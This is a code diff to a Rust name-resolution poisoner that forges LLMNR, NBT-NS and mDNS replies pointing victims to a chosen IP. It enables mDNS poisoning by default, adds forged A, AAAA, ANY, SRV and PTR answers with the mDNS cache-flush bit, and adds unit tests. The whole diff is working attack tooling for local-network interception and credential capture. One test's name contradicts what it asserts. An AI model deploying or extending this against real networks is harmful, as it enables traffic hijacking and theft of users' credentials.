@@ -209,7 +209,7 @@ impl Default for PoisonerConfig {
             timeout: 30,
             llmnr: true,
             nbtns: true,
-            mdns: false,
+            mdns: true,
             analyze_only: false,
             target_hosts: Vec::new(),
         }
@@ -521,7 +521,7 @@ impl Poisoner {
                             if should_poison && !analyze_only {
                                 // Send poisoned response (use appropriate IP version)
                                 if let Ok(response) =
-                                    Self::build_llmnr_response(&buf[..len], poison_ip, src.ip())
+                                    Self::build_llmnr_response(&buf[..len], poison_ip, false)
                                 {
                                     if let Err(e) = socket.send_to(&response, src) {
                                         warn!("Failed to send LLMNR response: {}", e);
@@ -584,7 +584,11 @@ impl Poisoner {
     }
 
     /// Build LLMNR/mDNS response with poisoned IP (supports IPv4 A and IPv6 AAAA records)
-    fn build_llmnr_response(query: &[u8], poison_ip: &str, src_ip: IpAddr) -> Result<Vec<u8>> {
+    fn build_llmnr_response(
+        query: &[u8],
+        poison_ip: &str,
+        mdns_cache_flush: bool,
+    ) -> Result<Vec<u8>> {
         let header = LlmnrHeader::parse(query)
             .ok_or_else(|| RelayError::Protocol("Invalid LLMNR query".to_string()))?;
 
@@ -593,54 +597,145 @@ impl Poisoner {
         // Response header
         response.extend_from_slice(&header.response().to_bytes());
 
-        // Copy question section from query
+        // Copy question section from query, extracting QTYPE
         let question_start = 12;
-        let mut question_end = question_start;
-        while question_end < query.len() {
-            if query[question_end] == 0 {
-                question_end += 5; // null terminator + type(2) + class(2)
+        let mut qtype_pos = question_start;
+        while qtype_pos < query.len() {
+            if query[qtype_pos] == 0 {
+                qtype_pos += 1; // null terminator
                 break;
             }
-            question_end += 1 + query[question_end] as usize;
+            qtype_pos += 1 + query[qtype_pos] as usize;
         }
 
-        if question_end > query.len() {
-            return Err(RelayError::Protocol("Invalid question section".to_string()).into());
+        if qtype_pos + 4 > query.len() {
+            return Err(RelayError::Protocol(format!(
+                "Invalid DNS question section: qtype_pos={}, query_len={}",
+                qtype_pos,
+                query.len()
+            ))
+            .into());
         }
 
+        // Copy the question (name + type + class) into response
+        let question_end = qtype_pos + 4;
         response.extend_from_slice(&query[question_start..question_end]);
 
-        // Build answer section
-        // Name pointer (compression) pointing to question
-        response.push(0xC0); // Compression pointer
-        response.push(0x0C); // Offset to question name
+        let qtype = u16::from_be_bytes([query[qtype_pos], query[qtype_pos + 1]]);
 
-        // Determine record type based on source IP version
-        let (record_type, rdata): (u16, Vec<u8>) = if src_ip.is_ipv6() {
-            // AAAA record for IPv6
-            let ip: Ipv6Addr = poison_ip
-                .parse()
-                .map_err(|_| RelayError::Config(format!("Invalid poison IPv6: {}", poison_ip)))?;
-            (28, ip.octets().to_vec())
-        } else {
-            // A record for IPv4
-            let ip: Ipv4Addr = poison_ip
-                .parse()
-                .map_err(|_| RelayError::Config(format!("Invalid poison IPv4: {}", poison_ip)))?;
-            (1, ip.octets().to_vec())
-        };
+        // Class value: IN (1) with optional mDNS cache-flush bit (0x8000)
+        let class_value: u16 = if mdns_cache_flush { 0x8001 } else { 1 };
 
-        response.extend_from_slice(&record_type.to_be_bytes());
-        // Class IN
-        response.extend_from_slice(&1u16.to_be_bytes());
-        // TTL (1 second for quick cache expiry)
-        response.extend_from_slice(&1u32.to_be_bytes());
-        // RDLENGTH
-        response.extend_from_slice(&(rdata.len() as u16).to_be_bytes());
-        // RDATA (IP address)
-        response.extend_from_slice(&rdata);
+        // Build answer records based on QTYPE
+        Self::append_answer_rr(&mut response, qtype, poison_ip, class_value)?;
 
         Ok(response)
+    }
+
+    /// Append one or more answer resource records matching the query type.
+    /// Returns an error only if no matching record could be built for the poison IP.
+    fn append_answer_rr(
+        response: &mut Vec<u8>,
+        qtype: u16,
+        poison_ip: &str,
+        class_value: u16,
+    ) -> Result<()> {
+        // Name pointer (compression) pointing to question name at offset 12
+        let name_ptr = [0xC0, 0x0C];
+
+        // For ANY (255), respond with both A and AAAA if the poison IP supports both
+        if qtype == 255 {
+            // Try A record
+            if let Ok(ip) = poison_ip.parse::<Ipv4Addr>() {
+                response.extend_from_slice(&name_ptr);
+                response.extend_from_slice(&1u16.to_be_bytes());
+                response.extend_from_slice(&class_value.to_be_bytes());
+                response.extend_from_slice(&1u32.to_be_bytes());
+                let rdata = ip.octets().to_vec();
+                response.extend_from_slice(&(rdata.len() as u16).to_be_bytes());
+                response.extend_from_slice(&rdata);
+            }
+            // Try AAAA record
+            if let Ok(ip) = poison_ip.parse::<Ipv6Addr>() {
+                response.extend_from_slice(&name_ptr);
+                response.extend_from_slice(&28u16.to_be_bytes());
+                response.extend_from_slice(&class_value.to_be_bytes());
+                response.extend_from_slice(&1u32.to_be_bytes());
+                let rdata = ip.octets().to_vec();
+                response.extend_from_slice(&(rdata.len() as u16).to_be_bytes());
+                response.extend_from_slice(&rdata);
+            }
+            return Ok(());
+        }
+
+        // SRV (33): service record pointing to poison_ip
+        if qtype == 33 {
+            response.extend_from_slice(&name_ptr);
+            response.extend_from_slice(&33u16.to_be_bytes());
+            response.extend_from_slice(&class_value.to_be_bytes());
+            response.extend_from_slice(&1u32.to_be_bytes());
+
+            let mut rdata = Vec::with_capacity(16);
+            rdata.extend_from_slice(&0u16.to_be_bytes()); // priority
+            rdata.extend_from_slice(&0u16.to_be_bytes()); // weight
+            rdata.extend_from_slice(&80u16.to_be_bytes()); // port
+            // Encode poison_ip as label sequence
+            for octet in poison_ip.split('.') {
+                rdata.push(octet.len() as u8);
+                rdata.extend_from_slice(octet.as_bytes());
+            }
+            rdata.push(0);
+            response.extend_from_slice(&(rdata.len() as u16).to_be_bytes());
+            response.extend_from_slice(&rdata);
+            return Ok(());
+        }
+
+        // PTR (12): reverse DNS pointer to poison_ip
+        if qtype == 12 {
+            response.extend_from_slice(&name_ptr);
+            response.extend_from_slice(&12u16.to_be_bytes());
+            response.extend_from_slice(&class_value.to_be_bytes());
+            response.extend_from_slice(&1u32.to_be_bytes());
+
+            let mut rdata = Vec::with_capacity(16);
+            for octet in poison_ip.split('.') {
+                rdata.push(octet.len() as u8);
+                rdata.extend_from_slice(octet.as_bytes());
+            }
+            rdata.push(0);
+            response.extend_from_slice(&(rdata.len() as u16).to_be_bytes());
+            response.extend_from_slice(&rdata);
+            return Ok(());
+        }
+
+        // AAAA (28): IPv6 address
+        if qtype == 28 {
+            if let Ok(ip) = poison_ip.parse::<Ipv6Addr>() {
+                response.extend_from_slice(&name_ptr);
+                response.extend_from_slice(&28u16.to_be_bytes());
+                response.extend_from_slice(&class_value.to_be_bytes());
+                response.extend_from_slice(&1u32.to_be_bytes());
+                let rdata = ip.octets().to_vec();
+                response.extend_from_slice(&(rdata.len() as u16).to_be_bytes());
+                response.extend_from_slice(&rdata);
+                return Ok(());
+            }
+            // No IPv6 address available - skip response
+            return Ok(());
+        }
+
+        // Default to A record (type 1 or any other type)
+        if let Ok(ip) = poison_ip.parse::<Ipv4Addr>() {
+            response.extend_from_slice(&name_ptr);
+            response.extend_from_slice(&1u16.to_be_bytes());
+            response.extend_from_slice(&class_value.to_be_bytes());
+            response.extend_from_slice(&1u32.to_be_bytes());
+            let rdata = ip.octets().to_vec();
+            response.extend_from_slice(&(rdata.len() as u16).to_be_bytes());
+            response.extend_from_slice(&rdata);
+        }
+
+        Ok(())
     }
 
     // =======================================================
@@ -858,8 +953,9 @@ impl Poisoner {
 
                             if should_poison && !analyze_only {
                                 // Build response - reuse LLMNR responder (same DNS wire format)
+                                // mDNS uses cache-flush bit (0x8000) on class field
                                 if let Ok(response) =
-                                    Self::build_llmnr_response(&buf[..len], poison_ip, src.ip())
+                                    Self::build_llmnr_response(&buf[..len], poison_ip, true)
                                 {
                                     // mDNS responses are sent via unicast to the source port
                                     if let Err(e) = socket.send_to(&response, src) {
@@ -889,7 +985,11 @@ impl Poisoner {
     /// Build NBT-NS response with poisoned IP
     fn build_nbtns_response(query: &[u8], poison_ip: &str) -> Result<Vec<u8>> {
         if query.len() < 14 {
-            return Err(RelayError::Protocol("NBT-NS query too short".to_string()).into());
+            return Err(RelayError::Protocol(format!(
+                "NBT-NS query too short: got {} bytes, expected at least 14",
+                query.len()
+            ))
+            .into());
         }
 
         let mut response = Vec::new();
@@ -914,7 +1014,12 @@ impl Poisoner {
         // Name field starts at offset 12 (not 14).
         let name_end = 12 + 32 + 2 + 1; // Header(12) + encoded name(32) + suffix(2) + null(1)
         if name_end > query.len() {
-            return Err(RelayError::Protocol("Invalid NBT-NS query format".to_string()).into());
+            return Err(RelayError::Protocol(format!(
+                "Invalid NBT-NS query format: expected at least {} bytes for name section, got {}",
+                name_end,
+                query.len()
+            ))
+            .into());
         }
         response.extend_from_slice(&query[12..name_end]);
 
@@ -962,7 +1067,7 @@ mod tests {
         assert_eq!(config.listen_ip, "::");
         assert!(config.llmnr);
         assert!(config.nbtns);
-        assert!(!config.mdns);
+        assert!(config.mdns);
         assert!(!config.analyze_only);
     }
 
@@ -1025,12 +1130,7 @@ mod tests {
             0x00, 0x01, // Class IN
         ];
 
-        let response = Poisoner::build_llmnr_response(
-            &query,
-            "192.168.1.100",
-            "192.168.1.50".parse().unwrap(),
-        )
-        .unwrap();
+        let response = Poisoner::build_llmnr_response(&query, "192.168.1.100", false).unwrap();
 
         // Check transaction ID copied
         assert_eq!(response[0..2], [0x00, 0x01]);
@@ -1063,5 +1163,143 @@ mod tests {
 
         poisoner.stop().await.unwrap();
         assert!(!poisoner.is_running());
+    }
+
+    /// Response format: header(12) + question(name+type+class) + answer_records.
+    /// For a query with "test.local" (12 byte name): question = 12(name) + 4(type+class) = 16 bytes.
+    /// So answer records start at offset 12 + 16 = 28.
+    const ANSWER_OFFSET: usize = 28;
+
+    #[test]
+    fn test_build_response_qtype_a_returns_a_record() {
+        let mut query = make_test_query();
+        let len = query.len();
+        query[len - 4] = 0x00;
+        query[len - 3] = 0x01;
+        let response = Poisoner::build_llmnr_response(&query, "10.0.0.1", false).unwrap();
+        // Skip name_ptr(2) to get to record fields
+        let record_start = ANSWER_OFFSET + 2;
+        let record_type = u16::from_be_bytes([response[record_start], response[record_start + 1]]);
+        assert_eq!(record_type, 1, "Should respond with A record");
+        let class = u16::from_be_bytes([response[record_start + 2], response[record_start + 3]]);
+        assert_eq!(class, 1, "Class should be IN (1)");
+        let rdlength_pos = record_start + 8;
+        let rdlength = u16::from_be_bytes([response[rdlength_pos], response[rdlength_pos + 1]]);
+        assert_eq!(rdlength, 4, "A record RDATA should be 4 bytes");
+        assert_eq!(
+            &response[rdlength_pos + 2..rdlength_pos + 6],
+            &[10, 0, 0, 1]
+        );
+    }
+
+    #[test]
+    fn test_build_response_qtype_aaaa_returns_aaaa_record() {
+        let mut query = make_test_query();
+        let len = query.len();
+        query[len - 4] = 0x00;
+        query[len - 3] = 0x1c;
+        let response = Poisoner::build_llmnr_response(&query, "fe80::1", false).unwrap();
+        let record_start = ANSWER_OFFSET + 2;
+        let record_type = u16::from_be_bytes([response[record_start], response[record_start + 1]]);
+        assert_eq!(record_type, 28, "Should respond with AAAA record");
+        let rdlength_pos = record_start + 8;
+        let rdlength = u16::from_be_bytes([response[rdlength_pos], response[rdlength_pos + 1]]);
+        assert_eq!(rdlength, 16, "AAAA record RDATA should be 16 bytes");
+    }
+
+    #[test]
+    fn test_build_response_qtype_aaaa_fallback_to_a_when_ipv4() {
+        let mut query = make_test_query();
+        let len = query.len();
+        query[len - 4] = 0x00;
+        query[len - 3] = 0x1c;
+        let response = Poisoner::build_llmnr_response(&query, "192.168.1.1", false).unwrap();
+        // Response should have only header(12) + question(16) = 28 bytes, no answer
+        assert_eq!(
+            response.len(),
+            ANSWER_OFFSET,
+            "No answer record should be appended"
+        );
+    }
+
+    #[test]
+    fn test_build_response_qtype_srv_returns_srv_record() {
+        let mut query = make_test_query();
+        let len = query.len();
+        query[len - 4] = 0x00;
+        query[len - 3] = 0x21;
+        let response = Poisoner::build_llmnr_response(&query, "10.0.0.1", false).unwrap();
+        let record_start = ANSWER_OFFSET + 2;
+        let record_type = u16::from_be_bytes([response[record_start], response[record_start + 1]]);
+        assert_eq!(record_type, 33, "Should respond with SRV record");
+        let rdlength_pos = record_start + 8;
+        let rdlength = u16::from_be_bytes([response[rdlength_pos], response[rdlength_pos + 1]]);
+        assert!(rdlength > 6, "SRV RDATA should include target name");
+    }
+
+    #[test]
+    fn test_build_response_qtype_ptr_returns_ptr_record() {
+        let mut query = make_test_query();
+        let len = query.len();
+        query[len - 4] = 0x00;
+        query[len - 3] = 0x0c;
+        let response = Poisoner::build_llmnr_response(&query, "10.0.0.1", false).unwrap();
+        let record_start = ANSWER_OFFSET + 2;
+        let record_type = u16::from_be_bytes([response[record_start], response[record_start + 1]]);
+        assert_eq!(record_type, 12, "Should respond with PTR record");
+    }
+
+    #[test]
+    fn test_build_response_qtype_any_returns_a_record() {
+        let mut query = make_test_query();
+        let len = query.len();
+        query[len - 4] = 0x00;
+        query[len - 3] = 0xff;
+        let response = Poisoner::build_llmnr_response(&query, "192.168.1.1", false).unwrap();
+        // Should have header(12) + question(16) + at least one answer record
+        assert!(
+            response.len() > ANSWER_OFFSET,
+            "Should have at least one answer record for ANY query"
+        );
+    }
+
+    #[test]
+    fn test_build_response_mdns_cache_flush_sets_bit() {
+        let mut query = make_test_query();
+        let len = query.len();
+        query[len - 4] = 0x00;
+        query[len - 3] = 0x01;
+        let response = Poisoner::build_llmnr_response(&query, "10.0.0.1", true).unwrap();
+        let record_start = ANSWER_OFFSET + 2;
+        let class = u16::from_be_bytes([response[record_start + 2], response[record_start + 3]]);
+        assert_eq!(class, 0x8001, "Cache-flush bit should be set in class");
+    }
+
+    #[test]
+    fn test_build_response_qtype_aaaa_only_responds_with_ipv6() {
+        let mut query = make_test_query();
+        let len = query.len();
+        query[len - 4] = 0x00;
+        query[len - 3] = 0x1c;
+        let response = Poisoner::build_llmnr_response(&query, "::1", false).unwrap();
+        let record_start = ANSWER_OFFSET + 2;
+        let record_type = u16::from_be_bytes([response[record_start], response[record_start + 1]]);
+        assert_eq!(record_type, 28, "AAAA response for IPv6 poison IP");
+    }
+
+    /// Helper: build a minimal DNS query with name "test.local"
+    fn make_test_query() -> Vec<u8> {
+        vec![
+            0x00, 0x01, // Transaction ID
+            0x00, 0x00, // Flags (query)
+            0x00, 0x01, // Questions
+            0x00, 0x00, // Answers
+            0x00, 0x00, // Authority
+            0x00, 0x00, // Additional
+            0x04, b't', b'e', b's', b't', 0x05, b'l', b'o', b'c', b'a', b'l',
+            0x00, // "test.local"
+            0x00, 0x01, // Type A (will be changed by tests)
+            0x00, 0x01, // Class IN
+        ]
     }
 }
